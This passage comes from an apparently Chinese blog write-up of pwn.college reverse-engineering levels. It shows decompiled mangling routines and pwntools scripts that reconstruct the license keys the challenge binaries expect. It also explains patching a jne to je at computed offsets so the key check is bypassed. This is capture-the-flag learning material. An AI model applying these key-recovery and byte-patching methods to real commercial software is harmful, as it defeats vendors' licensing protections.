class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>



<h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">5</span>` and `<span class="hljs-number">22</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `xor` mangler with key `<span class="hljs-number">0</span>x3c7c`<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">18</span>` and `<span class="hljs-number">33</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">3</span>` and `<span class="hljs-number">10</span>`.<br><span class="hljs-attribute">5f</span> <span class="hljs-number">5</span>e <span class="hljs-number">46</span> <span class="hljs-number">53</span> <span class="hljs-number">58</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">56</span> <span class="hljs-number">56</span> <span class="hljs-number">5</span>a <span class="hljs-number">52</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>e <span class="hljs-number">4</span>c <span class="hljs-number">4</span>a <span class="hljs-number">5</span>b <span class="hljs-number">1</span>f <span class="hljs-number">1</span>f <span class="hljs-number">1</span>f <span class="hljs-number">1</span>b <span class="hljs-number">19</span> <span class="hljs-number">16</span> <span class="hljs-number">16</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">12</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">08</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span><br></code></pre></td></tr></table></figure>



<p>虽然有这么多层修改，但是只需要关心<code>sort</code>前的修改即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level8.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x5f</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x3c</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x7c</span><br><br><span class="hljs-comment"># reverse</span><br>reversed_hex_string = hex_string[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># swap</span><br>temp = reversed_hex_string[<span class="hljs-number">5</span>]<br>reversed_hex_string[<span class="hljs-number">5</span>] = reversed_hex_string[<span class="hljs-number">22</span>]<br>reversed_hex_string[<span class="hljs-number">22</span>] = temp<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(reversed_hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(reversed_hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>



<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// swap  		0x5e97a08d5571</span><br>v3 = BYTE6(v15);<br>  BYTE6(v15) = v17;<br>  LOBYTE(v17) = v3;<br><span class="hljs-comment">// reverse		</span><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">17</span>; ++i )<br>  &#123;<br>    v7 = *((_BYTE *)&amp;buf + i);<br>    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - i);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - i) = v7;<br>  &#125;<br><span class="hljs-comment">// swap		0x5e97a08d55de </span><br>  v4 = BYTE3(buf);<br>  BYTE3(buf) = BYTE4(v14);<br>  BYTE4(v14) = v4;<br><span class="hljs-comment">// xor</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">36</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>        *((_BYTE *)&amp;buf + j) ^= <span class="hljs-number">0xA4u</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *((_BYTE *)&amp;buf + j) ^= <span class="hljs-number">0x48u</span>;<br>    &#125;<br>  &#125;<br><span class="hljs-comment">// reverse</span><br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">17</span>; ++k )<br>  &#123;<br>    v6 = *((_BYTE *)&amp;buf + k);<br>    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - k);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - k) = v6;<br>  &#125;<br><span class="hljs-comment">// reverse</span><br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">17</span>; ++m )<br>  &#123;<br>    v5 = *((_BYTE *)&amp;buf + m);<br>    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - m);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - m) = v5;<br>  &#125;<br><span class="hljs-comment">// xor</span><br>  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">36</span>; ++n )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( n % <span class="hljs-number">5</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x5Cu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xA3u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xBDu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x29u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x6Cu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x79</span>, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x8c, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>x55, <span class="hljs-number">0</span>x8e, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x0b, <span class="hljs-number">0</span>xbc, <span class="hljs-number">0</span>x64, <span class="hljs-number">0</span>x69, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>x5d, <span class="hljs-number">0</span>x97, <span class="hljs-number">0</span>x9d, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>xb2, <span class="hljs-number">0</span>x7b, <span class="hljs-number">0</span>x6e, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xe9, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>x6b, <span class="hljs-number">0</span>x13, <span class="hljs-number">0</span>xbd, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x9b, <span class="hljs-number">0</span>xf9, <span class="hljs-number">0</span>x53, <span class="hljs-number">0</span>x8f, <span class="hljs-number">0</span>x93<br></code></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>]		# <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">3</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4C], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_28+<span class="hljs-number">4</span>]	# <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">6</span>]	<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4B], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4B]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4C]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_28+<span class="hljs-number">4</span>], <span class="hljs-built_in">al</span>		# 交换<span class="hljs-number">3</span>和<span class="hljs-number">6</span><br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_40], <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_20+<span class="hljs-number">6</span>]		# 等价为 <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4E], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10]			# 等价为 <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + buf + <span class="hljs-number">20</span>]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_4D], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4D]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_20+<span class="hljs-number">6</span>], <span class="hljs-built_in">al</span>			# 交换<span class="hljs-number">16</span>和<span class="hljs-number">20</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_4E]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">al</span><br></code></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">原始输入：<br>xwwtngaurrlkodniozqnvoyennptjlxvqeyqm		<span class="hljs-number">22</span> ---- <span class="hljs-number">32</span><br>第一个： <span class="hljs-number">0x5ee6a471a571</span> (断点地址)<br>xwwtngaurrlkodniozqnvoqennptjlxvyeyqm<br>第二个： <span class="hljs-number">0x5ee6a471a5de</span><br>xwwtngaurrlkodniozqnvoqennptjlxvyeyqm<br><br>xwwtngaurrlkodniozqnvoyennptjlevqxyqm<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xwwtngaurrlkodniozqnvoyennptjlevqxyqm</span>		<span class="hljs-number">3</span> ---- <span class="hljs-number">12</span><br><span class="hljs-attribute">xwwtngaurrlkodniozqnvoqennptjlevyxyqm</span><br><span class="hljs-attribute">mqyxyveljtpnneqovnqzoindoklrruagntwwx</span><br><span class="hljs-attribute">mqynyveljtpnxeqovnqzoindoklrruagntwwx</span><br></code></pre></td></tr></table></figure>

<p>调试过程中，发现两个swap的具体交换位置。然后写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level8.1&quot;</span>)<br><br>hex_string=[<span class="hljs-number">0x79</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x93</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_string))<br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x5c</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xa3</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xbd</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">3</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x6c</span><br><br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xa4</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x48</span><br><br><span class="hljs-comment"># swap</span><br>temp = hex_string[<span class="hljs-number">3</span>]<br>hex_string[<span class="hljs-number">3</span>] = hex_string[<span class="hljs-number">12</span>]<br>hex_string[<span class="hljs-number">12</span>] = temp<br><br><br><span class="hljs-comment"># reverse</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    temp = hex_string[i]<br>    hex_string[i] = hex_string[<span class="hljs-number">36</span> - i]<br>    hex_string[<span class="hljs-number">36</span> - i] = temp<br><br><span class="hljs-comment"># swap</span><br>temp = hex_string[<span class="hljs-number">22</span>]<br>hex_string[<span class="hljs-number">22</span>] = hex_string[<span class="hljs-number">32</span>]<br>hex_string[<span class="hljs-number">32</span>] = temp<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>



<h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>看源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">v12 = ((<span class="hljs-type">unsigned</span> __int64)bin_padding &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000L</span>L) - <span class="hljs-number">4096</span>;<br><span class="hljs-keyword">do</span><br>  v3 = v6++;<br><span class="hljs-keyword">while</span> ( !mprotect((<span class="hljs-type">void</span> *)((v3 &lt;&lt; <span class="hljs-number">12</span>) + v12), <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">7</span>) );<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Changing byte %d/5.\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Offset (hex) to change: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%hx&quot;</span>, &amp;v5);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New value (hex): &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%hhx&quot;</span>, &amp;v4);<br>  *(_BYTE *)(v5 + v12) = v4;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The byte has been changed: *%p = %hhx.\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(v12 + v5), v4);<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>关于可执行文件的装载——页映射（理解上述源码的v12是什么）</p>
<p><strong>静态装载</strong>——程序执行时所需要的指令和数据必须在内存中才能够正常运行，最简单的办法就是将程序运行所需要的指令和数据全都装入内存中，这样程序就可以顺利运行，这就是最简单的静态装入的办法。</p>
<p>**问题：**很多情况下程序所需要的内存数量大于物理内存的数量。</p>
<p>根本的解决办法是<strong>添加物理内存</strong>。相对于磁盘来说，内存是昂贵的，因此人们想尽各种办法，<strong>希望能够不添加内存的情况下，让更多的程序运行起来，尽可能有效地利用内存。</strong></p>
<p>那么为了良好地解决这个问题，研究人员发现，程序运行时是有局部性原理的，所以，将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是动态装载的基本原理。<strong>动态装载的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</strong></p>
<p><strong>页映射</strong>——页映射不是一下子就把程序所有的数据和指令都装入内存，而是将内存和所有磁盘中的数据和指令按照“页(Page)”为单位划分成若干个页，以后所有的装载和操作的单位就是页。<strong>硬件规定的页的大小</strong>由4096字节、8192字节、2MB、4MB等，最常见的Intel IA32处理器一般都是用4096字节。这题所使用到的分页也是4096字节为一页。</p>
<p>假设程序所有的指令和数据的总和为32KB，机器为32位有16KB的内存，每个页大小为4096字节。那么程序总共被分为8个页。可人为将它们编号P0~P7。很明显，16KB的内存无法同时将32KB的程序装入，那么将按照动态装入的原理来进行整个装入过程。如果程序刚开始执行时的入口地址在P0，这时装载管理器发现程序的P0不在内存中，于是将内存F0分配给P0，并且将P0的内容装入F0；运行一段时间以后，程序需要用到P5，于是装载管理器将P5装入F1；就这样，映射关系如下所示：</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250304121108218.png" srcset="/img/loading.gif" lazyload class="" title="image-20250304121108218">

<p>【来源：《程序员的自我修养》P156】</p>
</blockquote>
<p>可以知道，v12计算得出上一页的起始地址。一页为4096字节。</p>
<p>解题思路：看到了if memcmp分支的条件。在ida中查看。其是jne，并且根据查表：<a target="_blank" rel="noopener" href="http://unixwiz.net/techtips/x86-jumps.html">Intel x86 JUMP quick reference</a>，可知jne的opcode是75，我们将其改成74即可控制分支。</p>
<p>根据思路，我们需要修改jne的opcode，通过gdb调试一下能够知道偏移量为<code>0x27c1</code>。最后我们只需要修改该位置的opcode为74，即可拿到flag。</p>
<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>思路同上，偏移为<code>0x1789</code>，不过这题用gdb调试的时候，没有main这个符号。可以设置断点在<code>_start</code>处，然后一步步调试。到main处的时候，就能拿到main的地址。然后使用<code>disassemble 起始地址,终止地址</code>来查看这个地址区间的反汇编结果。然后就能查看jne指令的地址。最后算出偏移为0x1789，再修改opcode就行了。</p>
<h4 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h4><p>只能修改一个字节，但是够了。思路还是以上的思路。算出偏移地址为：<code>0x1F17</code></p>
<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h4><p><code>gdb</code>的<code>finish</code>命令能够帮助快速执行完当前函数，断点可以打在<code>memcmp</code>函数这儿。偏移量为<code>0x201e</code></p>
